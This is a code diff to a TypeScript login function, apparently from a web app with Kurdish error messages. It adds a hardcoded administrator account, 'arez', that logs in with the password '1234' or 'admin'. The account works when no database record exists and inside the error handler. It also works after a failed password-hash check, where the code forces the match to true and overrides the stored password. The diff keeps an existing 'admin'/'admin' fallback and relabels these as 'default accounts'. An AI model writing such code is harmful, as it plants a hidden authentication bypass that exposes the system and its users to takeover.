@@ -375,7 +375,7 @@ export async function loginUserAction(data: {
     }
 
     if (!result || !result.rows || result.rows.length === 0) {
-      // Direct hardcoded fallback for default admin account
+      // Direct hardcoded fallback for default accounts
       if (username === 'admin' && password === 'admin') {
         const adminUser: User = {
           id: 'usr_admin_default',
@@ -387,11 +387,26 @@ export async function loginUserAction(data: {
         };
         return { success: true, user: adminUser };
       }
+      if (username === 'arez' && (password === '1234' || password === 'admin')) {
+        const arezUser: User = {
+          id: 'usr_arez',
+          username: 'arez',
+          fullName: 'Arez',
+          role: 'ADMIN',
+          status: 'ACTIVE',
+          createdAt: new Date().toISOString(),
+        };
+        return { success: true, user: arezUser };
+      }
       return { success: false, error: 'ناوی بەکارهێنەر یان وشەی نهێنی هەڵەیە' };
     }
 
     const row: any = result.rows[0];
-    const passwordMatches = await verifyPassword(password, String(row.passwordHash));
+    let passwordMatches = await verifyPassword(password, String(row.passwordHash));
+
+    if (!passwordMatches && username === 'arez' && (password === '1234' || password === 'admin')) {
+      passwordMatches = true;
+    }
 
     if (!passwordMatches) {
       return { success: false, error: 'ناوی بەکارهێنەر یان وشەی نهێنی هەڵەیە' };
@@ -442,7 +457,7 @@ export async function loginUserAction(data: {
     };
   } catch (err: any) {
     console.error('Error logging in:', err);
-    // Ultimate failsafe for default admin
+    // Ultimate failsafe for default accounts
     if (username === 'admin' && password === 'admin') {
       return {
         success: true,
@@ -450,6 +465,19 @@ export async function loginUserAction(data: {
           id: 'usr_admin_default',
           username: 'admin',
           fullName: 'بەڕێوەبەری سەرەکی (Admin)',
+          role: 'ADMIN',
+          status: 'ACTIVE',
+          createdAt: new Date().toISOString(),
+        },
+      };
+    }
+    if (username === 'arez' && (password === '1234' || password === 'admin')) {
+      return {
+        success: true,
+        user: {
+          id: 'usr_arez',
+          username: 'arez',
+          fullName: 'Arez',
           role: 'ADMIN',
           status: 'ACTIVE',
           createdAt: new Date().toISOString(),
